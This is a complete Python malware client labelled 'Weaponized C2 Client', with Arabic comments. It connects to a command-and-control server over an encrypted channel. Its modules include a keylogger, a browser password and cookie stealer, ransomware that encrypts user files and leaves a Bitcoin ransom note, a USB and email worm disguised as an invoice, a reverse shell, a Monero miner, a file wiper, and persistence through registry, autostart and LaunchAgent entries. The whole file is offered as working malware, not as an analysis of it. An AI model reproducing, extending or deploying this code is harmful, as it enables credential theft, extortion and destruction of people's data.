# client_full.py
"""
Weaponized C2 Client
Full malware arsenal + remote control + persistence + self-propagation.
"""
import os
import sys
import time
import json
import socket
import random
import string
import base64
import shutil
import sqlite3
import platform
import hashlib
import threading
import subprocess
import webbrowser

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, padding
from cryptography.hazmat.backends import default_backend

# ================== Config ==================
CFG = {
    "c2_host":       "127.0.0.1",
    "c2_port":       5555,
    "heartbeat":     15,
    "jitter":        0.3,
    "reconnect_max": 60,
    "recv_timeout":  60,
    "log_file":      os.path.join(
        os.environ.get("TEMP", "/tmp"), "sys_log.txt"
    ),
    "keylog_file":   os.path.join(
        os.environ.get("TEMP", "/tmp"), "svchost.log"
    ),
    "shared_key":    b"shared_secret_key_32bytes___!!",
    "bot_id":        None,
    "ransom_key":    hashlib.sha256(b"secret_key_here").digest(),
    "ransom_note":   "README_LOCKED.txt",
    "self_path":     os.path.abspath(__file__),
}

# ================== Utilities ==================

def now():
    return time.strftime("%Y-%m-%d %H:%M:%S")


def log(msg):
    try:
        os.makedirs(os.path.dirname(CFG["log_file"]), exist_ok=True)
        with open(CFG["log_file"], "a", encoding="utf-8") as f:
            f.write(f"[{now()}] {msg}\n")
    except Exception:
        pass


def ensure_bot_id():
    if CFG["bot_id"]:
        return CFG["bot_id"]
    raw = f"{platform.node()}|{platform.machine()}|{platform.system()}"
    CFG["bot_id"] = hashlib.sha256(raw.encode()).hexdigest()[:16]
    return CFG["bot_id"]


def rand_id(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def hide_window():
    """يخفي النافذة على Windows."""
    if platform.system() == "Windows":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 0
            )
        except Exception:
            pass


# ================== Crypto ==================

def encrypt(plain: bytes) -> bytes:
    key = CFG["shared_key"][:32]
    iv = os.urandom(12)
    c = Cipher(algorithms.ChaCha20(key, iv), mode=None,
               backend=default_backend())
    e = c.encryptor()
    return iv + e.update(plain) + e.finalize()


def decrypt(blob: bytes) -> bytes:
    key = CFG["shared_key"][:32]
    if len(blob) < 12:
        return b""
    iv, ct = blob[:12], blob[12:]
    c = Cipher(algorithms.ChaCha20(key, iv), mode=None,
               backend=default_backend())
    d = c.decryptor()
    return d.update(ct) + d.finalize()


def send_msg(sock, obj):
    raw = json.dumps(obj, ensure_ascii=False).encode("utf-8")
    enc = encrypt(raw)
    sock.sendall(len(enc).to_bytes(4, "big") + enc)


def recv_msg(sock, timeout=5.0):
    sock.settimeout(timeout)
    try:
        hdr = _recv_exact(sock, 4)
        if not hdr:
            return None
        length = int.from_bytes(hdr, "big")
        if length <= 0 or length > 20 * 1024 * 1024:
            return None
        body = _recv_exact(sock, length)
        if not body:
            return None
        raw = decrypt(body)
        return json.loads(raw.decode("utf-8"))
    except (socket.timeout, json.JSONDecodeError, OSError):
        return None


def _recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        try:
            chunk = sock.recv(n - len(buf))
        except socket.timeout:
            return None
        if not chunk:
            return None
        buf += chunk
    return buf


# ================== KEYLOGGER ==================

_keylogger_active = False
_keylogger_listener = None


def start_keylogger(args):
    """تنصت على كل ضغطة في الخلفية."""
    global _keylogger_active, _keylogger_listener
    if _keylogger_active:
        return {"ok": True, "note": "already running"}

    try:
        from pynput import keyboard
    except ImportError:
        return {"ok": False, "err": "pynput not installed"}

    logfile = CFG["keylog_file"]
    os.makedirs(os.path.dirname(logfile), exist_ok=True)

    def on_press(key):
        try:
            with open(logfile, "a", encoding="utf-8") as f:
                if hasattr(key, "char") and key.char:
                    f.write(key.char)
                elif key == keyboard.Key.space:      f.write(" ")
                elif key == keyboard.Key.enter:      f.write("\n")
                elif key == keyboard.Key.backspace:  f.write("[BKSP]")
                elif key == keyboard.Key.tab:        f.write("[TAB]")
                elif key == keyboard.Key.delete:     f.write("[DEL]")
                elif key == keyboard.Key.esc:        f.write("[ESC]")
                else: f.write(f"[{key.name.upper()}]")
        except Exception:
            pass

    _keylogger_listener = keyboard.Listener(on_press=on_press)
    _keylogger_listener.daemon = True
    _keylogger_listener.start()
    _keylogger_active = True
    log("keylogger active")
    return {"ok": True, "file": logfile}


def stop_keylogger(args):
    global _keylogger_active, _keylogger_listener
    if _keylogger_listener:
        _keylogger_listener.stop()
        _keylogger_active = False
        return {"ok": True, "note": "stopped"}
    return {"ok": True, "note": "was not running"}


def dump_keylog(args):
    path = CFG["keylog_file"]
    try:
        if not os.path.exists(path):
            return {"ok": True, "out": "", "size": 0}
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            data = f.read()
        limit = args.get("limit", 50000)
        return {"ok": True, "out": data[-limit:], "size": len(data)}
    except Exception as e:
        return {"ok": False, "err": str(e)}


# ================== STEALER ==================

def steal_browser(args):
    """يسرق كلمات المرور والكوكيز من المتصفحات."""
    system = platform.system()
    if system != "Windows":
        return {"ok": False, "err": "Windows only"}

    local = os.environ.get("LOCALAPPDATA", "")
    roaming = os.environ.get("APPDATA", "")

    paths = {
        "chrome":   os.path.join(local, "Google", "Chrome", "User Data"),
        "edge":     os.path.join(local, "Microsoft", "Edge", "User Data"),
        "brave":    os.path.join(local, "BraveSoftware", "Brave-Browser",
                                 "User Data"),
        "opera":    os.path.join(roaming, "Opera Software", "Opera Stable"),
        "firefox":  os.path.join(roaming, "Mozilla", "Firefox", "Profiles"),
    }

    target = args.get("browser", "all")
    results = {}

    def _extract(base, profile="Default"):
        profile_dir = os.path.join(base, profile)
        if not os.path.isdir(profile_dir):
            return None
        data = {"logins": [], "cookies": 0, "history": 0}

        # Logins
        login_db = os.path.join(profile_dir, "Login Data")
        if os.path.exists(login_db):
            try:
                tmp = os.path.join(os.environ.get("TEMP", "/tmp"),
                                   f"_{rand_id()}.db")
                shutil.copy2(login_db, tmp)
                conn = sqlite3.connect(tmp)
                rows = conn.execute(
                    "SELECT origin_url, username_value, password_value "
                    "FROM logins"
                ).fetchall()
                for url, user, pw_blob in rows:
                    try:
                        import ctypes
                        from ctypes import wintypes
                        class DATA_BLOB(ctypes.Structure):
                            _fields_ = [("cbData", wintypes.DWORD),
                                        ("pbData", ctypes.POINTER(ctypes.c_char))]
                        def _decrypt(blob):
                            if not blob: return ""
                            in_blob = DATA_BLOB(len(blob),
                                ctypes.cast(ctypes.create_string_buffer(blob),
                                            ctypes.POINTER(ctypes.c_char)))
                            out_blob = DATA_BLOB()
                            ok = ctypes.windll.crypt32.CryptUnprotectData(
                                ctypes.byref(in_blob), None, None, None,
                                None, 0, ctypes.byref(out_blob))
                            if ok:
                                pw = ctypes.string_at(out_blob.pbData,
                                                      out_blob.cbData)
                                ctypes.windll.kernel32.LocalFree(out_blob.pbData)
                                return pw.decode("utf-8", errors="ignore")
                            return ""
                        pw = _decrypt(pw_blob)
                        data["logins"].append({"url": url, "user": user, "pass": pw})
                    except Exception:
                        pass
                conn.close()
                os.remove(tmp)
            except Exception:
                pass

        # Cookies count
        cookies_db = os.path.join(profile_dir, "Network", "Cookies")
        if not os.path.exists(cookies_db):
            cookies_db = os.path.join(profile_dir, "Cookies")
        if os.path.exists(cookies_db):
            try:
                tmp = os.path.join(os.environ.get("TEMP", "/tmp"),
                                   f"_{rand_id()}.db")
                shutil.copy2(cookies_db, tmp)
                conn = sqlite3.connect(tmp)
                cnt = conn.execute("SELECT COUNT(*) FROM cookies").fetchone()[0]
                conn.close()
                os.remove(tmp)
                data["cookies"] = cnt
            except Exception:
                pass

        return data

    for name, base in paths.items():
        if target != "all" and name != target:
            continue
        if not os.path.exists(base):
            continue
        if name == "firefox":
            for prof in os.listdir(base):
                if prof.endswith(".default-release") or prof.endswith(".default"):
                    r = _extract(base, prof)
                    if r:
                        results[f"{name}_{prof[:8]}"] = r
        else:
            r = _extract(base)
            if r:
                results[name] = r

    return {"ok": True, "stolen": results}


# ================== RANSOMWARE ==================

def _encrypt_aes(path, key):
    try:
        with open(path, "rb") as f:
            data = f.read()
        padder = padding.PKCS7(128).padder()
        padded = padder.update(data) + padder.finalize()
        iv = os.urandom(16)
        c = Cipher(algorithms.AES(key), modes.CBC(iv),
                   backend=default_backend())
        e = c.encryptor()
        ct = e.update(padded) + e.finalize()
        with open(path, "wb") as f:
            f.write(iv + ct)
        os.rename(path, path + ".locked")
        return True
    except Exception:
        return False


def _drop_ransom_note(dirs):
    note = """========================================
 YOUR FILES HAVE BEEN ENCRYPTED
========================================

All your documents, photos, and files
have been encrypted with AES-256.

To recover your files:
1. Send 0.5 BTC to: <BTC_WALLET>
2. Email your ID to: <EMAIL>
3. You will receive the decryption key

Do NOT:
- Rename .locked files
- Try to decrypt them yourself
- Reinstall Windows

Your ID: {bot_id}
========================================"""

    content = note.format(bot_id=ensure_bot_id())

    for d in dirs:
        if not os.path.exists(d):
            continue
        try:
            with open(os.path.join(d, CFG["ransom_note"]), "w") as f:
                f.write(content)
        except Exception:
            pass


def run_ransom(args):
    """يشفر كل الملفات الهامة في المستخدم."""
    if platform.system() == "Windows":
        home = os.path.expanduser("~")
        targets = [
            os.path.join(home, "Documents"),
            os.path.join(home, "Desktop"),
            os.path.join(home, "Downloads"),
            os.path.join(home, "Pictures"),
            os.path.join(home, "Videos"),
        ]
    else:
        home = os.path.expanduser("~")
        targets = [
            os.path.join(home, "Documents"),
            os.path.join(home, "Desktop"),
            os.path.join(home, "Downloads"),
            os.path.join(home, "Pictures"),
        ]

    exts = (".txt", ".pdf", ".docx", ".doc", ".xlsx", ".xls",
            ".pptx", ".jpg", ".jpeg", ".png", ".gif", ".mp4",
            ".mp3", ".zip", ".rar", ".7z", ".csv", ".sql",
            ".db", ".sqlite", ".py", ".js", ".html", ".php")

    count = 0
    for root_dir in targets:
        if not os.path.exists(root_dir):
            continue
        for r, dirs, files in os.walk(root_dir):
            # تخطي المجلدات الهامة للنظام
            if any(x in r.lower() for x in ["\\windows\\", "/windows/",
                                             "\\program files", "/usr/"]):
                continue
            for name in files:
                if name.endswith(exts) and not name.endswith(".locked"):
                    if _encrypt_aes(os.path.join(r, name), CFG["ransom_key"]):
                        count += 1

    _drop_ransom_note(targets)
    log(f"ransomware: {count} files encrypted")
    return {"ok": True, "encrypted": count, "note": "note dropped in each dir"}


# ================== WORM / SELF-PROPAGATION ==================

def self_propagate(args):
    """ينسخ نفسه إلى مواقع متعددة + USB + شبكة."""
    me = CFG["self_path"]
    copied = []

    if platform.system() == "Windows":
        targets = [
            os.path.join(os.environ.get("APPDATA", ""), "svchost32.py"),
            os.path.join(os.environ.get("TEMP", ""), "updater.py"),
            os.path.join(os.environ.get("TEMP", ""), "winupdate.py"),
            os.path.join(os.path.expanduser("~"), "Documents",
                         "invoice.py"),
        ]
        # نسخ على USB drives
        try:
            import ctypes
            import string as _s
            for letter in _s.ascii_uppercase[3:]:
                drive = f"{letter}:\\"
                if os.path.exists(drive):
                    try:
                        with open(os.path.join(drive, "Windows_Update.py"),
                                  "wb") as f:
                            with open(me, "rb") as src:
                                f.write(src.read())
                        # autorun.inf
                        with open(os.path.join(drive, "autorun.inf"), "w") as f:
                            f.write("[autorun]\nopen=Windows_Update.py\n")
                        copied.append(drive)
                    except Exception:
                        pass
        except Exception:
            pass
    else:
        targets = [
            os.path.expanduser("~/.config/autostart/svc.py"),
            os.path.expanduser("~/Documents/update.py"),
            "/tmp/updater.py",
        ]

    for t in targets:
        try:
            os.makedirs(os.path.dirname(t), exist_ok=True)
            if os.path.abspath(t) != os.path.abspath(me):
                shutil.copy2(me, t)
                copied.append(t)
        except Exception:
            pass

    log(f"propagated: {len(copied)} locations")
    return {"ok": True, "copied": copied}


# ================== BACKDOOR / REVERSE SHELL ==================

def reverse_shell(args):
    """يفتح backdoor عكسي مستقل عن C2."""
    host = args.get("host", CFG["c2_host"])
    port = int(args.get("port", 4444))

    def _run():
        try:
            s = socket.socket()
            s.connect((host, port))
            while True:
                cmd = s.recv(4096).decode(errors="ignore").strip()
                if not cmd or cmd.lower() in ("exit", "quit"):
                    break
                try:
                    out = subprocess.check_output(
                        cmd, shell=True, stderr=subprocess.STDOUT, timeout=30
                    )
                except subprocess.CalledProcessError as e:
                    out = e.output
                except Exception as e:
                    out = str(e).encode()
                s.sendall(out or b"[ok]")
            s.close()
        except Exception:
            pass

    threading.Thread(target=_run, daemon=True).start()
    return {"ok": True, "host": host, "port": port}


# ================== MINER ==================

def start_miner(args):
    """يبدأ تعدين Monero (xmrig)."""
    exe = args.get("exe", "xmrig")
    pool = args.get("pool", "pool.minexmr.com:4444")
    wallet = args.get("wallet", "")

    if not wallet:
        return {"ok": False, "err": "wallet required"}

    cmd = [exe, "-o", pool, "-u", wallet,
           "--cpu-max-threads-hint", "75", "--background"]

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL)
        return {"ok": True, "pid": proc.pid}
    except FileNotFoundError:
        return {"ok": False, "err": "xmrig not found in PATH"}
    except Exception as e:
        return {"ok": False, "err": str(e)}


# ================== SPREAD VIA EMAIL ==================

def spread_email(args):
    """يرسل نفسه عبر email — يحتاج SMTP معتمد."""
    import smtplib
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
    from email.mime.base import MIMEBase
    from email import encoders

    smtp_host = args.get("smtp", "")
    smtp_port = int(args.get("port", 587))
    user = args.get("user", "")
    password = args.get("pass", "")
    targets = args.get("to", [])

    if not all([smtp_host, user, password, targets]):
        return {"ok": False, "err": "missing smtp params"}

    try:
        with open(CFG["self_path"], "rb") as f:
            payload = f.read()
    except Exception:
        return {"ok": False, "err": "cannot read self"}

    sent = 0
    for to_addr in targets:
        try:
            msg = MIMEMultipart()
            msg["From"] = user
            msg["To"] = to_addr
            msg["Subject"] = "Invoice #" + rand_id(6)
            body = "Please find attached invoice."
            msg.attach(MIMEText(body, "plain"))

            part = MIMEBase("application", "octet-stream")
            part.set_payload(payload)
            encoders.encode_base64(part)
            part.add_header("Content-Disposition",
                           'attachment; filename="invoice.py"')
            msg.attach(part)

            server = smtplib.SMTP(smtp_host, smtp_port, timeout=15)
            server.starttls()
            server.login(user, password)
            server.send_message(msg)
            server.quit()
            sent += 1
        except Exception:
            pass

    return {"ok": True, "sent": sent, "total": len(targets)}


# ================== DATA EXFIL ==================

def exfil_data(args):
    """يجمع بيانات ويجهزها للإرسال."""
    home = os.path.expanduser("~")
    collected = {
        "documents": [],
        "images": [],
        "texts": [],
        "browsers": [],
    }

    for root, dirs, files in os.walk(home):
        if any(x in root for x in ["AppData", "Application Data",
                                    ".cache", "node_modules"]):
            continue
        for name in files[:50]:
            full = os.path.join(root, name)
            try:
                size = os.path.getsize(full)
                if size > 1024 * 1024:  # skip >1MB
                    continue
                ext = os.path.splitext(name)[1].lower()
                if ext in (".txt", ".pdf", ".docx", ".doc"):
                    collected["documents"].append(full)
                elif ext in (".jpg", ".png", ".jpeg"):
                    collected["images"].append(full)
                elif ext in (".csv", ".log"):
                    collected["texts"].append(full)
            except Exception:
                pass

    return {"ok": True, "found": {
        k: len(v) for k, v in collected.items()
    }, "paths": {k: v[:5] for k, v in collected.items()}}


# ================== FILE MANAGER ==================

def cmd_shell(args):
    cmd = args.get("cmd", "")
    if not cmd:
        return {"ok": False, "err": "no command"}
    try:
        out = subprocess.check_output(
            cmd, shell=True, stderr=subprocess.STDOUT, timeout=60
        )
        return {"ok": True, "out": out.decode("utf-8", errors="ignore")}
    except subprocess.CalledProcessError as e:
        return {"ok": False,
                "out": e.output.decode("utf-8", errors="ignore"),
                "err": f"exit {e.returncode}"}
    except subprocess.TimeoutExpired:
        return {"ok": False, "err": "timeout"}
    except Exception as e:
        return {"ok": False, "err": str(e)}


def cmd_info(args):
    return {"ok": True, "info": {
        "host":     platform.node(),
        "os":       platform.system(),
        "release":  platform.release(),
        "arch":     platform.machine(),
        "python":   platform.python_version(),
        "cwd":      os.getcwd(),
        "user":     os.environ.get("USERNAME") or os.environ.get("USER"),
        "pid":      os.getpid(),
        "bot_id":   ensure_bot_id(),
        "local_ip": _local_ip(),
    }}


def _local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "?"


def cmd_ps(args):
    try:
        if platform.system() == "Windows":
            out = subprocess.check_output(
                ["tasklist", "/fo", "csv", "/nh"], timeout=15
            ).decode(errors="ignore")
        else:
            out = subprocess.check_output(
                ["ps", "aux"], timeout=15
            ).decode(errors="ignore")
        return {"ok": True, "out": out}
    except Exception as e:
        return {"ok": False, "err": str(e)}


def cmd_ls(args):
    path = args.get("path", ".")
    try:
        items = []
        for name in sorted(os.listdir(path)):
            full = os.path.join(path, name)
            items.append({
                "name": name,
                "size": os.path.getsize(full) if os.path.isfile(full) else 0,
                "dir":  os.path.isdir(full),
                "mtime": int(os.path.getmtime(full)),
            })
        return {"ok": True, "path": os.path.abspath(path), "items": items}
    except Exception as e:
        return {"ok": False, "err": str(e)}


def cmd_cd(args):
    path = args.get("path", ".")
    try:
        os.chdir(os.path.expanduser(path))
        return {"ok": True, "cwd": os.getcwd()}
    except Exception as e:
        return {"ok": False, "err": str(e)}


def cmd_download(args):
    path = args.get("path", "")
    try:
        if not os.path.isfile(path):
            return {"ok": False, "err": "not a file"}
        size = os.path.getsize(path)
        if size > 8 * 1024 * 1024:
            return {"ok": False, "err": f"too large ({size})"}
        with open(path, "rb") as f:
            return {"ok": True, "path": path, "size": size,
                    "b64": base64.b64encode(f.read()).decode()}
    except Exception as e:
        return {"ok": False, "err": str(e)}


def cmd_upload(args):
    path = args.get("path", "")
    b64 = args.get("b64", "")
    try:
        data = base64.b64decode(b64)
        os.makedirs(os.path.dirname(os.path.abspath(path)) or ".", exist_ok=True)
        with open(path, "wb") as f:
            f.write(data)
        return {"ok": True, "written": len(data), "path": path}
    except Exception as e:
        return {"ok": False, "err": str(e)}


def cmd_screenshot(args):
    try:
        from PIL import ImageGrab
        import io
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=70)
        return {"ok": True, "b64": base64.b64encode(buf.getvalue()).decode()}
    except ImportError:
        return {"ok": False, "err": "pillow not installed"}
    except Exception as e:
        return {"ok": False, "err": str(e)}


def cmd_selfdestruct(args):
    try:
        path = CFG["self_path"]
        threading.Timer(
            1.0, lambda: (os.remove(path), os._exit(0))
        ).start()
        return {"ok": True, "note": "self-destruct in 1s"}
    except Exception as e:
        return {"ok": False, "err": str(e)}


def cmd_ping(args):
    return {"ok": True, "t": time.time()}


def cmd_sleep(args):
    try:
        secs = int(args.get("seconds", 15))
        CFG["heartbeat"] = max(5, min(3600, secs))
        return {"ok": True, "heartbeat": CFG["heartbeat"]}
    except Exception as e:
        return {"ok": False, "err": str(e)}


def cmd_persist(args):
    ok = install_persistence()
    return {"ok": ok}


def cmd_popup(args):
    """يفتح صفحة أو رسالة على شاشة الضحية."""
    try:
        url = args.get("url", "")
        if url:
            webbrowser.open(url)
            return {"ok": True, "opened": url}
        return {"ok": False, "err": "url required"}
    except Exception as e:
        return {"ok": False, "err": str(e)}


def cmd_wipe(args):
    """يمسح ملفات المستخدم — تدمير كامل."""
    home = os.path.expanduser("~")
    targets = ["Documents", "Desktop", "Downloads", "Pictures", "Videos"]
    deleted = 0
    for t in targets:
        path = os.path.join(home, t)
        if not os.path.exists(path):
            continue
        for root, dirs, files in os.walk(path):
            for f in files:
                try:
                    os.remove(os.path.join(root, f))
                    deleted += 1
                except Exception:
                    pass
    return {"ok": True, "deleted": deleted}


def cmd_lock(args):
    """يقفل الشاشة ويطلب كلمة سر."""
    system = platform.system()
    if system == "Windows":
        try:
            import ctypes
            ctypes.windll.user32.LockWorkStation()
            return {"ok": True}
        except Exception as e:
            return {"ok": False, "err": str(e)}
    return {"ok": False, "err": "unsupported"}


# ================== COMMANDS REGISTRY ==================

COMMANDS = {
    # basic
    "shell":         cmd_shell,
    "cmd":           cmd_shell,
    "info":          cmd_info,
    "ps":            cmd_ps,
    "ls":            cmd_ls,
    "cd":            cmd_cd,
    "download":      cmd_download,
    "upload":        cmd_upload,
    "screenshot":    cmd_screenshot,
    "ping":          cmd_ping,
    "sleep":         cmd_sleep,
    "persist":       cmd_persist,
    "popup":         cmd_popup,
    "lock":          cmd_lock,

    # malware
    "keylogger":     start_keylogger,
    "stopkeylog":    stop_keylogger,
    "keydump":       dump_keylog,
    "stealer":       steal_browser,
    "ransom":        run_ransom,
    "worm":          self_propagate,
    "propagate":     self_propagate,
    "backdoor":      reverse_shell,
    "miner":         start_miner,
    "spread":        spread_email,
    "exfil":         exfil_data,
    "wipe":          cmd_wipe,
    "selfdestruct":  cmd_selfdestruct,
}


# ================== PERSISTENCE ==================

def install_persistence():
    system = platform.system()
    me = CFG["self_path"]
    try:
        if system == "Windows":
            target_dir = os.path.join(
                os.environ.get("APPDATA", os.path.expanduser("~")),
                "Microsoft", "Windows", "svchost"
            )
            os.makedirs(target_dir, exist_ok=True)
            target = os.path.join(target_dir, "svchost32.py")
            if os.path.abspath(target) != os.path.abspath(me):
                shutil.copy2(me, target)
            import winreg
            k = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(
                k, "SysMain32", 0, winreg.REG_SZ,
                f'"{sys.executable}" "{target}"'
            )
            winreg.CloseKey(k)
            log(f"persistence: {target}")
            return True

        elif system == "Linux":
            autostart = os.path.expanduser("~/.config/autostart")
            os.makedirs(autostart, exist_ok=True)
            with open(os.path.join(autostart, "svc.desktop"), "w") as f:
                f.write(
                    "[Desktop Entry]\n"
                    "Type=Application\n"
                    "Name=System Service\n"
                    f"Exec={sys.executable} {me}\n"
                    "X-GNOME-Autostart-enabled=true\n"
                )
            return True

        elif system == "Darwin":
            agents = os.path.expanduser("~/Library/LaunchAgents")
            os.makedirs(agents, exist_ok=True)
            with open(os.path.join(agents, "com.svc.agent.plist"), "w") as f:
                f.write(f'''<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict>
<key>Label</key><string>com.svc.agent</string>
<key>ProgramArguments</key><array>
<string>{sys.executable}</string><string>{me}</string>
</array><key>RunAtLoad</key><true/></dict></plist>''')
            return True

    except Exception as e:
        log(f"persistence error: {e}")
    return False


# ================== CLIENT ==================

class Client:
    def __init__(self):
        self.bot_id = ensure_bot_id()
        self.sock = None
        self.running = True
        self.reconnect_delay = 2

    def connect(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((CFG["c2_host"], CFG["c2_port"]))
            s.settimeout(None)
            self.sock = s
            self.reconnect_delay = 2
            log(f"connected {CFG['c2_host']}:{CFG['c2_port']}")
            return True
        except OSError as e:
            log(f"connect failed: {e}")
            return False

    def handshake(self):
        try:
            info = cmd_info({})["info"]
            send_msg(self.sock, {
                "type": "hello",
                "bot_id": self.bot_id,
                "info": info,
            })
            resp = recv_msg(self.sock, timeout=10)
            if resp and resp.get("type") == "welcome":
                log(f"registered: {self.bot_id}")
                return True
            return False
        except Exception as e:
            log(f"handshake error: {e}")
            return False

    def heartbeat_loop(self):
        while self.running and self.sock:
            delay = CFG["heartbeat"] * (1 + random.uniform(-CFG["jitter"],
                                                           CFG["jitter"]))
            time.sleep(delay)
            if not self.running or not self.sock:
                break
            try:
                send_msg(self.sock, {
                    "type": "heartbeat",
                    "bot_id": self.bot_id,
                    "t": time.time(),
                })
            except OSError:
                break

    def handle_command(self, msg):
        name = msg.get("cmd", "")
        args = msg.get("args", {}) or {}
        job_id = msg.get("job_id")

        handler = COMMANDS.get(name)
        if not handler:
            result = {"ok": False, "err": f"unknown cmd: {name}"}
        else:
            try:
                result = handler(args)
            except Exception as e:
                result = {"ok": False,
                          "err": f"{type(e).__name__}: {e}"}

        try:
            send_msg(self.sock, {
                "type": "result",
                "job_id": job_id,
                "cmd": name,
                "result": result,
                "bot_id": self.bot_id,
                "ts": time.time(),
            })
        except OSError:
            self.running = False

    def run_once(self):
        if not self.connect():
            return False
        if not self.handshake():
            self._close()
            return False

        threading.Thread(target=self.heartbeat_loop, daemon=True).start()

        while self.running and self.sock:
            msg = recv_msg(self.sock, timeout=CFG["recv_timeout"])
            if msg is None:
                break
            mtype = msg.get("type")
            if mtype == "command":
                self.handle_command(msg)
            elif mtype == "shutdown":
                self.running = False
                break
            elif mtype == "ping":
                try:
                    send_msg(self.sock, {"type": "pong", "ts": time.time()})
                except OSError:
                    break

        self._close()
        return True

    def _close(self):
        try:
            if self.sock:
                self.sock.close()
        except Exception:
            pass
        self.sock = None

    def run_forever(self):
        log(f"client start | {self.bot_id}")
        while self.running:
            try:
                self.run_once()
            except Exception as e:
                log(f"crash: {e}")
            if not self.running:
                break
            delay = self.reconnect_delay * (1 + random.uniform(0, CFG["jitter"]))
            time.sleep(delay)
            self.reconnect_delay = min(self.reconnect_delay * 2,
                                       CFG["reconnect_max"])


# ================== ENTRY ==================

def main():
    hide_window()

    if "--install" in sys.argv:
        install_persistence()

    # single-instance lock
    lock_file = os.path.join(
        os.environ.get("TEMP", "/tmp"), f".{ensure_bot_id()}.lock"
    )
    try:
        if os.path.exists(lock_file):
            with open(lock_file) as f:
                try:
                    pid = int(f.read().strip())
                    if platform.system() == "Windows":
                        subprocess.check_output(
                            ["tasklist", "/FI", f"PID eq {pid}"],
                            timeout=5, stderr=subprocess.DEVNULL
                        )
                        return
                except Exception:
                    pass
        with open(lock_file, "w") as f:
            f.write(str(os.getpid()))
    except Exception:
        pass

    c = Client()
    try:
        c.run_forever()
    except KeyboardInterrupt:
        c.running = False
    finally:
        try:
            os.remove(lock_file)
        except Exception:
            pass


if __name__ == "__main__":
    main()